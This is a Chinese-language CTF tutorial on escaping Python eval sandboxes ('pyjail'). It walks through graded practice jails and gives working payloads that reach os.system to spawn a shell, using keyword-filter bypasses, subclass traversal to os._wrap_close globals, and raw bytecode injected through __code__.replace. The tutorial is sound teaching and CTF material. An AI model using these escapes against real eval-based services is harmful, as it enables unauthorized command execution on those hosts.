# 超级简单的pyjail教程

## 00_入门

众所周知，python中可以使用`exec()`和`eval（）`来执行字符串形式的代码,比如：

```python
eval('print("Hello world!(eval)")')
exec('print("Hello world!(exec)")')
```

则会产生以下的输出：

```plaintext
Hello world!(eval)
Hello world!(exec)
```

---

我们可以看一下两个函数的详细定义：

```python
def eval(__source: str | bytes | CodeType,
         __globals: dict[str, Any] | None = ...,
         __locals: Mapping[str, Any] | None = ...) -> Any
```

```python
def exec(__source: str | bytes | CodeType,
         __globals: dict[str, Any] | None = ...,
         __locals: Mapping[str, Any] | None = ...) -> Any
```

可以看到二者的形式都是代码，全局变量，局部变量的函数形式，二者区别在于执行表达式还是语句，比如def f():return 0 这样的语句eval就不可以执行。

另外，二者都可以通过(code1,code2)的形式执行多句代码

```python
eval('(print("Hello world!(eval)"),print("Hello world second time!(eval)"),)')
exec('(print("Hello world!(exec)"),print("Hello world second time!(exec)"),)')
```

会产生以下的输出：

```plaintext
Hello world!(eval)
Hello world second time!(eval)
Hello world!(exec)
Hello world second time!(exec)
```

我们接下来以eval为例。

---

这里有个问题：如果不声明全局变量和环境变量的时候，这两个函数都会默认和外部代码共用全局变量，比如：

```python
x = 'Hello world from outside!'
eval('print(x)')
```

会产生以下的输出：

````plaintext
Hello world from outside!
````

这就是问题所在，也就是说如果不加以限制，简单的使用eval函数会很容易出现漏洞，但如果有限制的话，还能否做到这一点呢？这也就是pyjail的来源。

我们的目标是打开shell，一般是通过各种办法执行os.system("/bin/sh") # 在windows系统中则是os.system("cmd")

我们可以看一下这道练习题：

## _00_introduction.py

```python
def check_eval():
    payload = input('try os.system("cmd")!')
    try:
        eval(payload, {}, {})
        print('SUCCESS!')
    except:

        print('ERROR!')
        pass


check_eval()
```

这是最简单的pyjail，可以看到代码里通过声明了全局变量和局部变量来使得payload无法访问源代码中的内容，这时我们还能成功吗？

答案是肯定的，因为在python中即使不引入任何外部包或者外部变量，依然有一类函数是通用的——内置函数/方法，也就是`__builtins__`里的函数/方法。

我们可以打印`dir(__builtins__)`来查看可以使用哪些：

```plaintext
['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BaseExceptionGroup',
 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError',
 'ConnectionAbortedError', 'ConnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning',
 'EOFError', 'Ellipsis', 'EncodingWarning', 'EnvironmentError', 'Exception',
 'ExceptionGroup', 'False', 'FileExistsError', 'FileNotFoundError', 'FloatingPointError',
 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning',
 'IndentationError', 'IndexError', 'InterruptedError', 'IsADirectoryError', 'KeyError',
 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError',
 'None', 'NotADirectoryError', 'NotImplemented', 'NotImplementedError', 'OSError',
 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError',
 'ReferenceError', 'ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration',
 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit',
 'TabError', 'TimeoutError', 'True', 'TypeError', 'UnboundLocalError',
 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning',
 'UserWarning', 'ValueError', 'Warning', 'WindowsError', 'ZeroDivisionError',
 '__build_class__', '__debug__', '__doc__', '__import__', '__loader__',
 '__name__', '__package__', '__spec__', 'abs', 'aiter',
 'all', 'anext', 'any', 'ascii', 'bin',
 'bool', 'breakpoint', 'bytearray', 'bytes', 'callable',
 'chr', 'classmethod', 'compile', 'complex', 'copyright',
 'credits', 'delattr', 'dict', 'dir', 'divmod',
 'enumerate', 'eval', 'exec', 'exit', 'filter',
 'float', 'format', 'frozenset', 'getattr', 'globals',
 'hasattr', 'hash', 'help', 'hex', 'id',
 'input', 'int', 'isinstance', 'issubclass', 'iter',
 'len', 'license', 'list', 'locals', 'map',
 'max', 'memoryview', 'min', 'next', 'object',
 'oct', 'open', 'ord', 'pow', 'print',
 'property', 'quit', 'range', 'repr', 'reversed',
 'round', 'set', 'setattr', 'slice', 'sorted',
 'staticmethod', 'str', 'sum', 'super', 'tuple',
 'type', 'vars', 'zip']

```

可以看到有非常多的函数可以使用。比如解决这道题的关键是`__import__`方法，当它被调用的时候相当于`import`关键字的使用，并且能够返回被引入的包，因此这道题可以被轻松解决：

````python
payload = __import__("os").system("cmd")
````

# 01_一些使用内置方法的简单的绕过

假如题目设置了关键词审查，我们很自然的会想到使用编码解决，但问题在于编码是以字符的形式，无法作为代码的一部分出现，怎么办？

我们可以利用`__getattribute__`绕过：

`__getattribute__`提供了一个根据字符串找到对象的方法的函数，参考以下代码:

```python
a = "test"

print(getattr.__doc__)

print(a.upper())

print(getattr(a,'upper')())

print(a.__getattribute__('upper')())

print(str.__getattribute__(a,"upper")())
```

以下是输出结果：

```plaintext
Get a named attribute from an object; getattr(x, 'y') is equivalent to x.y.
When a default argument is given, it is returned when the attribute doesn't
exist; without it, an exception is raised in that case.
TEST
TEST
TEST
TEST
```

可以看到以上代码具有相同的作用，因此下面的这道练习题可以被轻松解决：

## _01_babypyjail

```python
def check_eval():
    a = input('try os.system("cmd")!')
    if a.find('system') != -1:
        print('NO WAY!')
        return
    else:
        try:
            eval(a, {},{})
            print('SUCCESS!')
        except:
            print('ERROR!')
            pass


del __builtins__.__dict__['eval']
check_eval()
```

我们只需采取简单的绕过：

```python
payload = __import__("os").__getattribute__('\x73\x79\x73\x74\x65\x6d')("cmd")
```

## _02_morebabypyjail

如果有更多的限制呢？

```python
def check_eval():
    a = input('try os.system("cmd")!')
    if a.find('\'') != -1 or a.find('\"') != -1 \
            or '[' in a \
            or ']' in a \
            or '{' in a \
            or '}' in a \
            or "\'" in a \
            or "\"" in a \
            or not all(0 <= ord(c) <= 255 for c in a) \
            or any(c.isdigit() for c in a):
        print('NO WAY!')
        return
    else:
        try:
            eval(a, {}, {})
            print('SUCCESS!')
        except:
            print('ERROR!')
            pass
```

可以看到这里面有许多限制，如何在原有的基础上进行改动？

禁止中括号：可以使用`__getitem__`的方式. # 来自官方代码： `""" x.__getitem__(y) <==> x[y] """`

禁止引号：可以使用`list(dict(arg = 1))`的方式，由于dict被直接调用时字典中的键可以作为参数传入无需加引号，而list又会将字典中的键转换为列表中的元素，再通过数字索引找到对应的元素来逃脱字符串审查。

（有些情况无法使用内置函数，可以通过python方法`__doc__`来获取一个对应类的字符串类型的帮助文档，通过对文档内容切片来拼成想要的字符串）

禁止数字：可以使用`ord(x) - ord(y)` 的形式，或者使用`True,any(())`等获取简单数字

综上所述，我们可以构造出这道题的payload：

```python
payload = __import__(list(dict(os=True)).__getitem__(int(any(())))).system(list(dict(cmd=True)).__getitem__(int(any(()))))
```

## 03_nobuiltins

如果builtin被删除了呢？

假设我们通过 `__builtins__.__dict__.clear()` 删除了所有的内置函数，我们是否还有方法绕过？

答案是有的，由于python“万物皆对象”，所有子类都继承于object类型，因此我们理论上可以根据object对象直接执行对应子类在python层面定义的函数来绕过`__builtins__`的删除

具体实现如下：

1. 获取`object`对象。我们通过`__class__`能够获得一个实例所属的类，在python中有`__mro__`的python方法，储存了一个包含自身的其所有父链的元组：

```python
print(str.__mro__)
```

输出如下：

```plaintext
(<class 'str'>, <class 'object'>)
```

因此，我们可以使用 `''.__class__.__mro__[1]`的方式来获取object对象。

2. 获取`os._wrap_close`。python方法`__subclassess__`调用时返回一个包含其所有子类的列表，可以使用直接索引或者匿名函数查找关键词来找到`_wrap_close`的内置子类。

`os._wrap_close`模块是os的一个类，提供了对文件描述符的处理，提供了一个执行系统函数的途径，代码摘抄如下：

```python
class _wrap_close:
    def __init__(self, stream, proc):
        self._stream = stream
        self._proc = proc
```

但我们需要的只是这个os模块。因此我们只需使用`__init__`创建一个`_wrap_close`的实例，就可以制造一个具有os环境的操作空间，

3. 执行系统函数。 由于python中的全局变量可以通过`__globals__`获取，因此当我们创造了这个操作空间后，可以通过它获取到这个空间内的所有变量，
   而`os`内部具有`system`的内置函数，因此我们可以之后直接通过使用`system("cmd")`来执行系统命令。

因此接下来这道题目可以被轻松解决：

## _03_nobuiltins

```python
backup_eval = eval
backup_input = input
backup_print = print

__builtins__.__dict__.clear()


def check_eval():
    a = backup_input('try os.system("cmd")!')
    try:
        backup_eval(a, {}, {})
        backup_print('SUCCESS!')
    except:
        backup_print('ERROR!')
        pass


check_eval()
```

代码总结如下：

```python
payload = ''.__class__.__mro__[1].__subclasses__()[142].__init__.__globals__['system']('cmd')
```

## 04_codeobject

如果有额外的限制，比如nobuiltins环境下"s"的个数，那么之前的方法就失效了，还有什么利用python机制的方法吗？

答案是有的。既然python函数也是对象，那我能否通过函数的内部机制来凭空构造出一个函数？答案是可以的。例如我们之前如果定义函数为`f`：

当我们调用函数时执行的代码由`__code__`定义：

```python
def f():
    ''.__class__.__mro__[1].__subclasses__()[142].__init__.__globals__['system']('cmd')


print(f.__code__)
print(dir(f.__code__))
```

会得到以下结果，可以看到code也是一个对象：

```plaintext
<code object f at 0x00000281D42A2E20, file "D:\misc\Pycharm\ctf\pwn\pyjail\01.py", line 1>

['__class__', '__delattr__', '__dir__', '__doc__', '__eq__',
 '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__',
 '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__',
 '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__',
 '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '_co_code_adaptive',
 '_varname_from_oparg', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts',
 'co_exceptiontable', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars',
 'co_kwonlyargcount', 'co_lines', 'co_linetable', 'co_lnotab', 'co_name',
 'co_names', 'co_nlocals', 'co_positions', 'co_posonlyargcount', 'co_qualname',
 'co_stacksize', 'co_varnames', 'replace']
```

既然code也是对象，我们是否可以对一个普通的函数修改其`__code__`的内容？答案显然是可以的，在code object和执行的函数主要相关的只有`co_code,co_nlocals,co_varnames,co_names,co_consts`,

只要我们将一个函数对象的`__code__`中的内容修改成这样，我们就可以获得一个相同功能的函数。那么该如何替换呢？

python中为`__code__`的修改提供了`replace`函数，能够返回一个修改过的code object，因此下面这道题就迎刃而解了：

## _04_osujail

```python
backup_eval = eval
backup_print = print
backup_input = input
backup_all = all
backup_ord = ord

def rescued_osu(input):
    return input.count('o') == 1 and input.count('s') == 1 and input.count('u') == 1

def caught_by_guards(input):
    return '[' in input \
        or ']' in input \
        or '{' in input\
        or '}' in input \
        or not backup_all(0 <= backup_ord(c) <= 255 for c in input)

globals()['__builtins__'].__dict__.clear()



input = backup_input()
if caught_by_guards(input) or not rescued_osu(input):
    backup_print('[You failed to break the jail]')
else:
    backup_print(backup_eval(input,{},{}))
```

这道题出自osuctf原题，可以看到使用了nobuiltins环境，限制ascii范围，禁止中括号大括号，限制osu出现次数的审查。因此我们尝试通过对`__code__`的重写构造一个具有和_03相同功能的函数：

首先查看原函数的字典情况：

```python
def f():
    return ().__class__.__mro__[1].__subclasses__()[142].__init__.__globals__['system']('cmd')


print(f"code:{f.__code__.co_code}")
print(f"nlocals:{f.__code__.co_nlocals}")
print(f"varnames:{f.__code__.co_varnames}")
print(f"names:{f.__code__.co_names}")
print(f"consts:{f.__code__.co_consts}")
```

输出如下：

```plaintext
code:b'\x97\x00\x02\x00d\x01j\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x02\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00j\x04\x00\x00\x00\x00\x00\x00\x00\x00d\x04\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00S\x00'
nlocals:0
varnames:()
names:('__class__', '__mro__', '__subclasses__', '__init__', '__globals__')
consts:(None, '', 1, 142, 'system', 'cmd')
```

因此我们只需要构造一个函数，修改对应的属性即可。`lambda`提供了匿名函数的构造，可以使用`f:=lambda:()`将匿名函数赋值给f绕过`def`关键字的识别。

构造之后我们需要对f的`__code__`进行修改，`__code__`中提供了`replace`函数，通过传递参数可以返回更新后的code object,因此我们需要将这个返回的code object更新到f中。

我们使用python方法`__setattr__`来对`__code__`进行修改，它的作用相当于`setattr()`

根据上述思路初步构建的输入：

```python
payload = (
    f:=lambda:(),
    f.__setattr__(
        "__code__",f.__code__.replace(
            co_consts=(None, '', 1, 142, 'system', 'cmd'),
            co_code=b'\x97\x00\x02\x00d\x01j\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x02\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00j\x04\x00\x00\x00\x00\x00\x00\x00\x00d\x04\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00S\x00',
            co_names=('__class__','__mro__','__subclasses__','__init__','__globals__')
        )
    ),
    f()
)
```

但是这里遇到了一个问题：写成这样后None可以被替换成0以减少o的个数，但依然有无法避免的o和s出现在`replace`函数的参数中，我们需要想办法将替换合并：

一个自然的想法是传入一个字典，因为字典的键可以是字符串，因此可以用编码绕过字符检查，但是`{}`也被禁止使用了，我们需要一个在nobuiltins环境下可以使用的字典。

实际上是可以做到的，`__dict__`为我们提供了内置字典，用于存储这个类(或者实例)的属性。用`__dict__`自带的函数update来存储内容即可。

最终构造如下：

```python
payload = (
    f := lambda:(),
    f.__dict__.update((
        ('c\x6f_c\x6fn\x73t\x73',(0, '', 1, 142, '\x73y\x73tem', 'cmd')),
        ('c\x6f_name\x73', ('__cla\x73\x73__', '__mr\x6f__', '__\x73\x75bcla\x73\x73e\x73__', '__init__', '__gl\x6fbal\x73__')),
        ('c\x6f_c\x6fde',b'\x97\x00\x02\x00d\x01j\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x02\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00j\x04\x00\x00\x00\x00\x00\x00\x00\x00d\x04\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00S\x00')
    )),
    f.__setattr__('__c\x6fde__', f.__code__.replace(**f.__dict__)),
    f()
)
```

我们写成一行即可输入：

```python
payload = (f := lambda:(),f.__dict__.update((('c\x6f_c\x6fn\x73t\x73',(0, '', 1, 142, '\x73y\x73tem', 'cmd')),('c\x6f_name\x73', ('__cla\x73\x73__', '__mr\x6f__', '__\x73\x75bcla\x73\x73e\x73__', '__init__', '__gl\x6fbal\x73__')),('c\x6f_c\x6fde',b'\x97\x00\x02\x00d\x01j\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x02\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00j\x04\x00\x00\x00\x00\x00\x00\x00\x00d\x04\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00S\x00'))),f.__setattr__('__c\x6fde__', f.__code__.replace(**f.__dict__)),f())
```

